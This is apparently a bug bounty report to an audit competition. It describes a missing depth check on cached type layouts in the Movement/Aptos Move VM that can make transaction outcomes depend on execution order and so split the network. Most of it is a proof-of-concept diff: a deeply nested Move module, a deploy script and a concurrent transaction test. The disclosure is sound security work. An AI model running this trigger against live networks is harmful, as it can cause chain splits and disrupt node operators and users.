# #43333 \[BC-Critical] Missing Depths Checks in Cached TypeLayout leads to Network Divergence

**Submitted on Apr 4th 2025 at 17:06:23 UTC by @dustincha for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #43333
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/attackathon-movement-aptos-core/tree/main>
* **Impacts:**
  * Unintended chain split (network partition)

## Description

## Brief/Intro

During an in-depth review of Movement VM's type layout construction, I observed a critical issue relating to the caching of constructed type layouts. Initially, while analyzing type construction and the associated depth checks, I noticed these checks are only performed during the initial construction of a type layout and are not repeated when fetching layouts from cache. I looked into potential DOS abusing this behavior, but actually found this can lead to execution inconsistencies give the order of execution and what is already in the cache.

## Vulnerability Details

When building type layouts (<https://github.com/immunefi-team/attackathon-movement-aptos-core/blame/627b4f9e0b63c33746fa5dae6cd672cbee3d8631/third\\_party/move/move-vm/runtime/src/loader/mod.rs#L1794-L1801C8>), a maximum depth check of 128 is enforced. However, the same check is not enforced within `struct_name_to_type_layout` when fetching types from the cache (<https://github.com/immunefi-team/attackathon-movement-aptos-core/blame/627b4f9e0b63c33746fa5dae6cd672cbee3d8631/third\\_party/move/move-vm/runtime/src/loader/mod.rs#L1677-L1687>). This means that if part of the recursive structure has already been built and cached, the type could be successfully created even if it exceeds the intended depth limit.

Consider two threads, T1 and T2:

* Thread T1 executes `create_v3` just before Thread T2 executes `create_v128`. When Thread T2 constructs `V128`, it reaches just before the maximum depth, finds `V3` already cached, uses it directly, and bypasses further depth checks, causing the transaction to succeed.
* Conversely, if Thread T2 executes first, `create_v128` will fail, as it exceeds the maximum allowed depth.

This scenario clearly demonstrates a potential execution divergence issue.

## Impact Details

The network will diverge and split depending on which transaction gets executed first.

## Proof of Concept

## Proof of Concept

I originally intended to provide a complete E2E PoC, but encountered some issues running both the Movement CLI and Aptos CLI in the NIX environment. Although I was actively working on resolving these issues, unfortunately, the deadline is approaching quickly, and I'd prefer not to risk missing it.

Run the test with: `DOT_MOVEMENT_PATH=../../../.movement cargo test test_cache_typelayout -- --nocapture` from `networks/movement/movement-client/`.

```
diff --git a/networks/movement/movement-client/src/tests/cache-typelayout/.gitignore b/networks/movement/movement-client/src/tests/cache-typelayout/.gitignore
new file mode 100644
index 000000000..f930c403b
--- /dev/null
+++ b/networks/movement/movement-client/src/tests/cache-typelayout/.gitignore
@@ -0,0 +1,2 @@
+build/
+.aptos
\ No newline at end of file
diff --git a/networks/movement/movement-client/src/tests/cache-typelayout/Move.toml b/networks/movement/movement-client/src/tests/cache-typelayout/Move.toml
new file mode 100644
index 000000000..274d97f5f
--- /dev/null
+++ b/networks/movement/movement-client/src/tests/cache-typelayout/Move.toml
@@ -0,0 +1,17 @@
+[package]
+name = "cache-typelayout"
+version = "1.0.0"
+authors = []
+
+[addresses]
+cache_typelayout = "_"
+
+[dev-addresses]
+cache_typelayout = "_"
+
+[dependencies.AptosFramework]
+git = "https://github.com/movementlabsxyz/aptos-core.git"
+rev = "9dfc8e7a3d622597dfd81cc4ba480a5377f87a41"
+subdir = "aptos-move/framework/aptos-framework"
+
+[dev-dependencies]
diff --git a/networks/movement/movement-client/src/tests/cache-typelayout/deploy.sh b/networks/movement/movement-client/src/tests/cache-typelayout/deploy.sh
new file mode 100644
index 000000000..4b5c0a0dd
--- /dev/null
+++ b/networks/movement/movement-client/src/tests/cache-typelayout/deploy.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+
+echo "Current directory:"
+pwd
+# Initializes an account if keys are not present
+echo "Initializing account"
+echo "NODE_URL: $NODE_URL"
+echo "FAUCET_URL: $FAUCET_URL"
+initialize_output=$(echo -ne '\n' | movement init --network custom --rest-url $NODE_URL --faucet-url $FAUCET_URL --assume-yes)
+echo "$initialize_output"
+
+echo "Publishing the module"
+movement move clean --assume-yes
+movement move publish --package-dir src/tests/cache-typelayout --named-addresses cache_typelayout=default --assume-yes
\ No newline at end of file
diff --git a/networks/movement/movement-client/src/tests/cache-typelayout/sources/resource_roulette.move b/networks/movement/movement-client/src/tests/cache-typelayout/sources/resource_roulette.move
new file mode 100644
index 000000000..dea8f43ca
--- /dev/null
+++ b/networks/movement/movement-client/src/tests/cache-typelayout/sources/resource_roulette.move
@@ -0,0 +1,658 @@
+module cache_typelayout::cache_typelayout {
+
+            struct V1 has key, store, drop {}
+            struct V2 has key, store, drop { V: V1 }
+            struct V3 has key, store, drop { V: V2 }
+            struct V4 has key, store, drop { V: V3 }
+            struct V5 has key, store, drop { V: V4 }
+            struct V6 has key, store, drop { V: V5 }
+            struct V7 has key, store, drop { V: V6 }
+            struct V8 has key, store, drop { V: V7 }
+            struct V9 has key, store, drop { V: V8 }
+            struct V10 has key, store, drop { V: V9 }
+            struct V11 has key, store, drop { V: V10 }
+            struct V12 has key, store, drop { V: V11 }
+            struct V13 has key, store, drop { V: V12 }
+            struct V14 has key, store, drop { V: V13 }
+            struct V15 has key, store, drop { V: V14 }
+            struct V16 has key, store, drop { V: V15 }
+            struct V17 has key, store, drop { V: V16 }
+            struct V18 has key, store, drop { V: V17 }
+            struct V19 has key, store, drop { V: V18 }
+            struct V20 has key, store, drop { V: V19 }
+            struct V21 has key, store, drop { V: V20 }
+            struct V22 has key, store, drop { V: V21 }
+            struct V23 has key, store, drop { V: V22 }
+            struct V24 has key, store, drop { V: V23 }
+            struct V25 has key, store, drop { V: V24 }
+            struct V26 has key, store, drop { V: V25 }
+            struct V27 has key, store, drop { V: V26 }
+            struct V28 has key, store, drop { V: V27 }
+            struct V29 has key, store, drop { V: V28 }
+            struct V30 has key, store, drop { V: V29 }
+            struct V31 has key, store, drop { V: V30 }
+            struct V32 has key, store, drop { V: V31 }
+            struct V33 has key, store, drop { V: V32 }
+            struct V34 has key, store, drop { V: V33 }
+            struct V35 has key, store, drop { V: V34 }
+            struct V36 has key, store, drop { V: V35 }
+            struct V37 has key, store, drop { V: V36 }
+            struct V38 has key, store, drop { V: V37 }
+            struct V39 has key, store, drop { V: V38 }
+            struct V40 has key, store, drop { V: V39 }
+            struct V41 has key, store, drop { V: V40 }
+            struct V42 has key, store, drop { V: V41 }
+            struct V43 has key, store, drop { V: V42 }
+            struct V44 has key, store, drop { V: V43 }
+            struct V45 has key, store, drop { V: V44 }
+            struct V46 has key, store, drop { V: V45 }
+            struct V47 has key, store, drop { V: V46 }
+            struct V48 has key, store, drop { V: V47 }
+            struct V49 has key, store, drop { V: V48 }
+            struct V50 has key, store, drop { V: V49 }
+            struct V51 has key, store, drop { V: V50 }
+            struct V52 has key, store, drop { V: V51 }
+            struct V53 has key, store, drop { V: V52 }
+            struct V54 has key, store, drop { V: V53 }
+            struct V55 has key, store, drop { V: V54 }
+            struct V56 has key, store, drop { V: V55 }
+            struct V57 has key, store, drop { V: V56 }
+            struct V58 has key, store, drop { V: V57 }
+            struct V59 has key, store, drop { V: V58 }
+            struct V60 has key, store, drop { V: V59 }
+            struct V61 has key, store, drop { V: V60 }
+            struct V62 has key, store, drop { V: V61 }
+            struct V63 has key, store, drop { V: V62 }
+            struct V64 has key, store, drop { V: V63 }
+            struct V65 has key, store, drop { V: V64 }
+            struct V66 has key, store, drop { V: V65 }
+            struct V67 has key, store, drop { V: V66 }
+            struct V68 has key, store, drop { V: V67 }
+            struct V69 has key, store, drop { V: V68 }
+            struct V70 has key, store, drop { V: V69 }
+            struct V71 has key, store, drop { V: V70 }
+            struct V72 has key, store, drop { V: V71 }
+            struct V73 has key, store, drop { V: V72 }
+            struct V74 has key, store, drop { V: V73 }
+            struct V75 has key, store, drop { V: V74 }
+            struct V76 has key, store, drop { V: V75 }
+            struct V77 has key, store, drop { V: V76 }
+            struct V78 has key, store, drop { V: V77 }
+            struct V79 has key, store, drop { V: V78 }
+            struct V80 has key, store, drop { V: V79 }
+            struct V81 has key, store, drop { V: V80 }
+            struct V82 has key, store, drop { V: V81 }
+            struct V83 has key, store, drop { V: V82 }
+            struct V84 has key, store, drop { V: V83 }
+            struct V85 has key, store, drop { V: V84 }
+            struct V86 has key, store, drop { V: V85 }
+            struct V87 has key, store, drop { V: V86 }
+            struct V88 has key, store, drop { V: V87 }
+            struct V89 has key, store, drop { V: V88 }
+            struct V90 has key, store, drop { V: V89 }
+            struct V91 has key, store, drop { V: V90 }
+            struct V92 has key, store, drop { V: V91 }
+            struct V93 has key, store, drop { V: V92 }
+            struct V94 has key, store, drop { V: V93 }
+            struct V95 has key, store, drop { V: V94 }
+            struct V96 has key, store, drop { V: V95 }
+            struct V97 has key, store, drop { V: V96 }
+            struct V98 has key, store, drop { V: V97 }
+            struct V99 has key, store, drop { V: V98 }
+            struct V100 has key, store, drop { V: V99 }
+            struct V101 has key, store, drop { V: V100 }
+            struct V102 has key, store, drop { V: V101 }
+            struct V103 has key, store, drop { V: V102 }
+            struct V104 has key, store, drop { V: V103 }
+            struct V105 has key, store, drop { V: V104 }
+            struct V106 has key, store, drop { V: V105 }
+            struct V107 has key, store, drop { V: V106 }
+            struct V108 has key, store, drop { V: V107 }
+            struct V109 has key, store, drop { V: V108 }
+            struct V110 has key, store, drop { V: V109 }
+            struct V111 has key, store, drop { V: V110 }
+            struct V112 has key, store, drop { V: V111 }
+            struct V113 has key, store, drop { V: V112 }
+            struct V114 has key, store, drop { V: V113 }
+            struct V115 has key, store, drop { V: V114 }
+            struct V116 has key, store, drop { V: V115 }
+            struct V117 has key, store, drop { V: V116 }
+            struct V118 has key, store, drop { V: V117 }
+            struct V119 has key, store, drop { V: V118 }
+            struct V120 has key, store, drop { V: V119 }
+            struct V121 has key, store, drop { V: V120 }
+            struct V122 has key, store, drop { V: V121 }
+            struct V123 has key, store, drop { V: V122 }
+            struct V124 has key, store, drop { V: V123 }
+            struct V125 has key, store, drop { V: V124 }
+            struct V126 has key, store, drop { V: V125 }
+            struct V127 has key, store, drop { V: V126 }
+            struct V128 has key, store, drop { V: V127 } //off-by-one
+            
+            //Create a smaller version of the above to be cached and then skip the depth check
+            // Bulding V2 should be sufficent too
+            public entry fun create_V3_entry(sender: &signer) {
+                let i = 0;
+                while (i < 100_000) {
+                  i = i + 1;
+                };
+                let lV3 = V3 { V: V2 { V: V1 {} } };
+                move_to(sender, lV3);
+            }
+            public fun create_V1(): V1 {
+                V1 {}
+            }
+
+            public fun create_V2(): V2 {
+                V2 { V: create_V1() }
+            }
+
+            public fun create_V3(): V3 {
+                V3 { V: create_V2() }
+            }
+
+            public fun create_V4(): V4 {
+                V4 { V: create_V3() }
+            }
+
+            public fun create_V5(): V5 {
+                V5 { V: create_V4() }
+            }
+
+            public fun create_V6(): V6 {
+                V6 { V: create_V5() }
+            }
+
+            public fun create_V7(): V7 {
+                V7 { V: create_V6() }
+            }
+
+            public fun create_V8(): V8 {
+                V8 { V: create_V7() }
+            }
+
+            public fun create_V9(): V9 {
+                V9 { V: create_V8() }
+            }
+
+            public fun create_V10(): V10 {
+                V10 { V: create_V9() }
+            }
+
+            public fun create_V11(): V11 {
+                V11 { V: create_V10() }
+            }
+
+            public fun create_V12(): V12 {
+                V12 { V: create_V11() }
+            }
+
+            public fun create_V13(): V13 {
+                V13 { V: create_V12() }
+            }
+
+            public fun create_V14(): V14 {
+                V14 { V: create_V13() }
+            }
+
+            public fun create_V15(): V15 {
+                V15 { V: create_V14() }
+            }
+
+            public fun create_V16(): V16 {
+                V16 { V: create_V15() }
+            }
+
+            public fun create_V17(): V17 {
+                V17 { V: create_V16() }
+            }
+
+            public fun create_V18(): V18 {
+                V18 { V: create_V17() }
+            }
+
+            public fun create_V19(): V19 {
+                V19 { V: create_V18() }
+            }
+
+            public fun create_V20(): V20 {
+                V20 { V: create_V19() }
+            }
+
+            public fun create_V21(): V21 {
+                V21 { V: create_V20() }
+            }
+
+            public fun create_V22(): V22 {
+                V22 { V: create_V21() }
+            }
+
+            public fun create_V23(): V23 {
+                V23 { V: create_V22() }
+            }
+
+            public fun create_V24(): V24 {
+                V24 { V: create_V23() }
+            }
+
+            public fun create_V25(): V25 {
+                V25 { V: create_V24() }
+            }
+
+            public fun create_V26(): V26 {
+                V26 { V: create_V25() }
+            }
+
+            public fun create_V27(): V27 {
+                V27 { V: create_V26() }
+            }
+
+            public fun create_V28(): V28 {
+                V28 { V: create_V27() }
+            }
+
+            public fun create_V29(): V29 {
+                V29 { V: create_V28() }
+            }
+
+            public fun create_V30(): V30 {
+                V30 { V: create_V29() }
+            }
+
+            public fun create_V31(): V31 {
+                V31 { V: create_V30() }
+            }
+
+            public fun create_V32(): V32 {
+                V32 { V: create_V31() }
+            }
+
+            public fun create_V33(): V33 {
+                V33 { V: create_V32() }
+            }
+
+            public fun create_V34(): V34 {
+                V34 { V: create_V33() }
+            }
+
+            public fun create_V35(): V35 {
+                V35 { V: create_V34() }
+            }
+
+            public fun create_V36(): V36 {
+                V36 { V: create_V35() }
+            }
+
+            public fun create_V37(): V37 {
+                V37 { V: create_V36() }
+            }
+
+            public fun create_V38(): V38 {
+                V38 { V: create_V37() }
+            }
+
+            public fun create_V39(): V39 {
+                V39 { V: create_V38() }
+            }
+
+            public fun create_V40(): V40 {
+                V40 { V: create_V39() }
+            }
+
+            public fun create_V41(): V41 {
+                V41 { V: create_V40() }
+            }
+
+            public fun create_V42(): V42 {
+                V42 { V: create_V41() }
+            }
+
+            public fun create_V43(): V43 {
+                V43 { V: create_V42() }
+            }
+
+            public fun create_V44(): V44 {
+                V44 { V: create_V43() }
+            }
+
+            public fun create_V45(): V45 {
+                V45 { V: create_V44() }
+            }
+
+            public fun create_V46(): V46 {
+                V46 { V: create_V45() }
+            }
+
+            public fun create_V47(): V47 {
+                V47 { V: create_V46() }
+            }
+
+            public fun create_V48(): V48 {
+                V48 { V: create_V47() }
+            }
+
+            public fun create_V49(): V49 {
+                V49 { V: create_V48() }
+            }
+
+            public fun create_V50(): V50 {
+                V50 { V: create_V49() }
+            }
+
+            public fun create_V51(): V51 {
+                V51 { V: create_V50() }
+            }
+
+            public fun create_V52(): V52 {
+                V52 { V: create_V51() }
+            }
+
+            public fun create_V53(): V53 {
+                V53 { V: create_V52() }
+            }
+
+            public fun create_V54(): V54 {
+                V54 { V: create_V53() }
+            }
+
+            public fun create_V55(): V55 {
+                V55 { V: create_V54() }
+            }
+
+            public fun create_V56(): V56 {
+                V56 { V: create_V55() }
+            }
+
+            public fun create_V57(): V57 {
+                V57 { V: create_V56() }
+            }
+
+            public fun create_V58(): V58 {
+                V58 { V: create_V57() }
+            }
+
+            public fun create_V59(): V59 {
+                V59 { V: create_V58() }
+            }
+
+            public fun create_V60(): V60 {
+                V60 { V: create_V59() }
+            }
+
+            public fun create_V61(): V61 {
+                V61 { V: create_V60() }
+            }
+
+            public fun create_V62(): V62 {
+                V62 { V: create_V61() }
+            }
+
+            public fun create_V63(): V63 {
+                V63 { V: create_V62() }
+            }
+
+            public fun create_V64(): V64 {
+                V64 { V: create_V63() }
+            }
+
+            public fun create_V65(): V65 {
+                V65 { V: create_V64() }
+            }
+
+            public fun create_V66(): V66 {
+                V66 { V: create_V65() }
+            }
+
+            public fun create_V67(): V67 {
+                V67 { V: create_V66() }
+            }
+
+            public fun create_V68(): V68 {
+                V68 { V: create_V67() }
+            }
+
+            public fun create_V69(): V69 {
+                V69 { V: create_V68() }
+            }
+
+            public fun create_V70(): V70 {
+                V70 { V: create_V69() }
+            }
+
+            public fun create_V71(): V71 {
+                V71 { V: create_V70() }
+            }
+
+            public fun create_V72(): V72 {
+                V72 { V: create_V71() }
+            }
+
+            public fun create_V73(): V73 {
+                V73 { V: create_V72() }
+            }
+
+            public fun create_V74(): V74 {
+                V74 { V: create_V73() }
+            }
+
+            public fun create_V75(): V75 {
+                V75 { V: create_V74() }
+            }
+
+            public fun create_V76(): V76 {
+                V76 { V: create_V75() }
+            }
+
+            public fun create_V77(): V77 {
+                V77 { V: create_V76() }
+            }
+
+            public fun create_V78(): V78 {
+                V78 { V: create_V77() }
+            }
+
+            public fun create_V79(): V79 {
+                V79 { V: create_V78() }
+            }
+
+            public fun create_V80(): V80 {
+                V80 { V: create_V79() }
+            }
+
+            public fun create_V81(): V81 {
+                V81 { V: create_V80() }
+            }
+
+            public fun create_V82(): V82 {
+                V82 { V: create_V81() }
+            }
+
+            public fun create_V83(): V83 {
+                V83 { V: create_V82() }
+            }
+
+            public fun create_V84(): V84 {
+                V84 { V: create_V83() }
+            }
+
+            public fun create_V85(): V85 {
+                V85 { V: create_V84() }
+            }
+
+            public fun create_V86(): V86 {
+                V86 { V: create_V85() }
+            }
+
+            public fun create_V87(): V87 {
+                V87 { V: create_V86() }
+            }
+
+            public fun create_V88(): V88 {
+                V88 { V: create_V87() }
+            }
+
+            public fun create_V89(): V89 {
+                V89 { V: create_V88() }
+            }
+
+            public fun create_V90(): V90 {
+                V90 { V: create_V89() }
+            }
+
+            public fun create_V91(): V91 {
+                V91 { V: create_V90() }
+            }
+
+            public fun create_V92(): V92 {
+                V92 { V: create_V91() }
+            }
+
+            public fun create_V93(): V93 {
+                V93 { V: create_V92() }
+            }
+
+            public fun create_V94(): V94 {
+                V94 { V: create_V93() }
+            }
+
+            public fun create_V95(): V95 {
+                V95 { V: create_V94() }
+            }
+
+            public fun create_V96(): V96 {
+                V96 { V: create_V95() }
+            }
+
+            public fun create_V97(): V97 {
+                V97 { V: create_V96() }
+            }
+
+            public fun create_V98(): V98 {
+                V98 { V: create_V97() }
+            }
+
+            public fun create_V99(): V99 {
+                V99 { V: create_V98() }
+            }
+
+            public fun create_V100(): V100 {
+                V100 { V: create_V99() }
+            }
+
+            public fun create_V101(): V101 {
+                V101 { V: create_V100() }
+            }
+
+            public fun create_V102(): V102 {
+                V102 { V: create_V101() }
+            }
+
+            public fun create_V103(): V103 {
+                V103 { V: create_V102() }
+            }
+
+            public fun create_V104(): V104 {
+                V104 { V: create_V103() }
+            }
+
+            public fun create_V105(): V105 {
+                V105 { V: create_V104() }
+            }
+
+            public fun create_V106(): V106 {
+                V106 { V: create_V105() }
+            }
+
+            public fun create_V107(): V107 {
+                V107 { V: create_V106() }
+            }
+
+            public fun create_V108(): V108 {
+                V108 { V: create_V107() }
+            }
+
+            public fun create_V109(): V109 {
+                V109 { V: create_V108() }
+            }
+
+            public fun create_V110(): V110 {
+                V110 { V: create_V109() }
+            }
+
+            public fun create_V111(): V111 {
+                V111 { V: create_V110() }
+            }
+
+            public fun create_V112(): V112 {
+                V112 { V: create_V111() }
+            }
+
+            public fun create_V113(): V113 {
+                V113 { V: create_V112() }
+            }
+
+            public fun create_V114(): V114 {
+                V114 { V: create_V113() }
+            }
+
+            public fun create_V115(): V115 {
+                V115 { V: create_V114() }
+            }
+
+            public fun create_V116(): V116 {
+                V116 { V: create_V115() }
+            }
+
+            public fun create_V117(): V117 {
+                V117 { V: create_V116() }
+            }
+
+            public fun create_V118(): V118 {
+                V118 { V: create_V117() }
+            }
+
+            public fun create_V119(): V119 {
+                V119 { V: create_V118() }
+            }
+
+            public fun create_V120(): V120 {
+                V120 { V: create_V119() }
+            }
+
+            public fun create_V121(): V121 {
+                V121 { V: create_V120() }
+            }
+
+            public fun create_V122(): V122 {
+                V122 { V: create_V121() }
+            }
+
+            public fun create_V123(): V123 {
+                V123 { V: create_V122() }
+            }
+
+            public fun create_V124(): V124 {
+                V124 { V: create_V123() }
+            }
+
+            public fun create_V125(): V125 {
+                V125 { V: create_V124() }
+            }
+
+            public fun create_V126(): V126 {
+                V126 { V: create_V125() }
+            }
+
+            public fun create_V127(): V127 {
+                V127 { V: create_V126() }
+            }
+
+            public fun create_V128(): V128 {
+                V128 { V: create_V127() }
+            }
+
+            public entry fun create_V128_entry(sender: &signer) {
+                move_to(sender, create_V128());
+            }
+
+}
\ No newline at end of file
diff --git a/networks/movement/movement-client/src/tests/mod.rs b/networks/movement/movement-client/src/tests/mod.rs
index 539796588..0aa5883bb 100644
--- a/networks/movement/movement-client/src/tests/mod.rs
+++ b/networks/movement/movement-client/src/tests/mod.rs
@@ -1,34 +1,57 @@
 // pub mod alice_bob;
 pub mod indexer_stream;
-use crate::load_soak_testing::{execute_test, init_test, ExecutionConfig, Scenario, TestKind};
+
 use crate::{
 	coin_client::CoinClient,
+	load_soak_testing::{execute_test, init_test, ExecutionConfig, Scenario, TestKind},
 	rest_client::{
 		aptos_api_types::{TransactionOnChainData, ViewFunction},
 		Client, FaucetClient,
 	},
 	transaction_builder::TransactionBuilder,
-	types::{chain_id::ChainId, LocalAccount},
 };
+
+use aptos_sdk::{
+	crypto::{
+		ed25519::{Ed25519PrivateKey, Ed25519PublicKey},
+		PrivateKey, SigningKey, Uniform, ValidCryptoMaterialStringExt,
+	},
+	move_types::{
+		identifier::Identifier,
+		language_storage::{ModuleId, TypeTag},
+	},
+	types::{
+		account_address::AccountAddress,
+		chain_id::ChainId,
+		keyless::{
+			EphemeralCertificate, IdCommitment, KeylessPublicKey, KeylessSignature, OpenIdSig,
+			Pepper, TransactionAndProof,
+		},
+		transaction::{
+			authenticator::{
+				AccountAuthenticator, AnyPublicKey, AnySignature, AuthenticationKey,
+				EphemeralPublicKey, EphemeralSignature, SingleKeyAuthenticator,
+				TransactionAuthenticator,
+			},
+			EntryFunction, RawTransaction, Script, SignedTransaction, TransactionPayload,
+		},
+		LocalAccount,
+	},
+};
+
 use anyhow::Context;
-use aptos_sdk::crypto::ed25519::Ed25519PrivateKey;
-use aptos_sdk::crypto::ValidCryptoMaterialStringExt;
-use aptos_sdk::move_types::identifier::Identifier;
-use aptos_sdk::move_types::language_storage::ModuleId;
-use aptos_sdk::types::account_address::AccountAddress;
-use aptos_sdk::types::transaction::authenticator::AuthenticationKey;
-use aptos_sdk::types::transaction::EntryFunction;
-use aptos_sdk::types::transaction::TransactionPayload;
-use aptos_sdk::{crypto::ed25519::Ed25519PublicKey, move_types::language_storage::TypeTag};
 use buildtime_helpers::cargo::cargo_workspace;
 use commander::run_command;
 use once_cell::sync::Lazy;
 use serde::{de::DeserializeOwned, Deserialize};
-use std::path::PathBuf;
-use std::str::FromStr;
-use std::time::{SystemTime, UNIX_EPOCH};
-use std::{fs, sync::Arc};
-use std::{thread, time};
+use std::{
+	fs,
+	path::PathBuf,
+	str::FromStr,
+	sync::Arc,
+	thread,
+	time::{self, SystemTime, UNIX_EPOCH},
+};
 use url::Url;
 
 static SUZUKA_CONFIG: Lazy<movement_config::Config> = Lazy::new(|| {
@@ -594,3 +617,149 @@ async fn test_hey_partners_internal() -> Result<(), anyhow::Error> {
 	println!("Output: {}", output);
 	Ok(())
 }
+
+#[tokio::test]
+pub async fn test_cache_typelayout() -> Result<(), anyhow::Error> {
+	test_cache_typelayout_internal().await
+}
+
+async fn test_cache_typelayout_internal() -> Result<(), anyhow::Error> {
+	println!("Running test_cache_typelayout");
+	std::env::set_var("NODE_URL", NODE_URL.clone().as_str());
+	std::env::set_var("FAUCET_URL", FAUCET_URL.clone().as_str());
+
+	// Get the root path of the cargo workspace
+	let root: PathBuf = cargo_workspace()?;
+	let additional_path = "networks/movement/movement-client/src/tests/cache-typelayout/";
+	let combined_path = root.join(additional_path);
+
+	// Convert the combined path to a string
+	let test = combined_path.to_string_lossy();
+	println!("{}", test);
+
+	// Run the deploy script
+	let init_output =
+		run_command("/bin/bash", &[format!("{}{}", test, "deploy.sh").as_str()]).await?;
+	println!("{}", init_output);
+
+	let five_sec = time::Duration::from_millis(5000);
+	thread::sleep(five_sec);
+
+	let yaml_content = fs::read_to_string(".aptos/config.yaml")?;
+
+	let config: Config = serde_yaml::from_str(&yaml_content)?;
+
+	// Access the `account` field
+	let module_address = AccountAddress::from_hex_literal(
+		format!("0x{}", config.profiles.default.account).as_str(),
+	)?;
+	let private_key_import = &config.profiles.default.private_key;
+	let private_key = Ed25519PrivateKey::from_encoded_string(private_key_import)?;
+
+	let public_key = Ed25519PublicKey::from(&private_key);
+	let account_address = AuthenticationKey::ed25519(&public_key).account_address();
+
+	let rest_client = Client::new(NODE_URL.clone());
+
+	let account_client = rest_client.get_account(account_address).await?;
+	let sequence_number = account_client.inner().sequence_number;
+	println!("{}", account_address);
+	println!("{}", module_address);
+
+	let faucet_client = FaucetClient::new(FAUCET_URL.clone(), NODE_URL.clone());
+	let chain_id = rest_client.get_index().await?.inner().chain_id;
+
+	// Create three accounts: publisher, executor1, and executor2
+	let publisher = LocalAccount::generate(&mut rand::rngs::OsRng);
+	let executor1 = LocalAccount::generate(&mut rand::rngs::OsRng);
+	let executor2 = LocalAccount::generate(&mut rand::rngs::OsRng);
+
+	// Print account addresses
+	println!("\n=== Addresses ===");
+	println!("Publisher: {}", publisher.address().to_hex_literal());
+	println!("Executor1: {}", executor1.address().to_hex_literal());
+	println!("Executor2: {}", executor2.address().to_hex_literal());
+
+	// Fund all accounts
+	faucet_client
+		.fund(publisher.address(), 100_000_000)
+		.await
+		.context("Failed to fund publisher's account")?;
+	faucet_client
+		.fund(executor1.address(), 100_000_000)
+		.await
+		.context("Failed to fund executor1's account")?;
+	faucet_client
+		.fund(executor2.address(), 100_000_000)
+		.await
+		.context("Failed to fund executor2's account")?;
+
+	let empty_type_tag: Vec<TypeTag> = Vec::new();
+
+	// Publisher publishes the package
+	println!("\n=== Publishing Package ===");
+	match send_tx(
+		&rest_client,
+		chain_id,
+		&publisher,
+		module_address,
+		"cache_typelayout",
+		"publish",
+		empty_type_tag.clone(),
+		vec![],
+	)
+	.await
+	{
+		Ok(tx) => println!("Package published: {:?}", tx),
+		Err(e) => println!("Failed to publish package: {:?}", e),
+	}
+
+	// Wait a bit for the package to be published
+	thread::sleep(time::Duration::from_secs(2));
+
+	// Create two futures for concurrent execution
+	let executor1_future = async {
+		println!("\n=== Executor1 calling create_V3 ===");
+		match send_tx(
+			&rest_client,
+			chain_id,
+			&executor1,
+			module_address,
+			"cache_typelayout",
+			"create_V3",
+			empty_type_tag.clone(),
+			vec![],
+		)
+		.await
+		{
+			Ok(tx) => println!("Executor1 create_V3 successful: {:?}", tx),
+			Err(e) => println!("Executor1 create_V3 failed: {:?}", e),
+		}
+	};
+
+	let executor2_future = async {
+		println!("\n=== Executor2 calling create_V128 ===");
+		match send_tx(
+			&rest_client,
+			chain_id,
+			&executor2,
+			module_address,
+			"cache_typelayout",
+			"create_V128",
+			empty_type_tag.clone(),
+			vec![],
+		)
+		.await
+		{
+			Ok(tx) => println!("Executor2 create_V128 successful: {:?}", tx),
+			Err(e) => println!("Executor2 create_V128 failed: {:?}", e),
+		}
+	};
+
+	// Execute both futures concurrently
+	println!("\n=== Executing transactions concurrently ===");
+	tokio::join!(executor1_future, executor2_future);
+
+	println!("\n=== Test completed ===");
+	Ok(())
+}
```
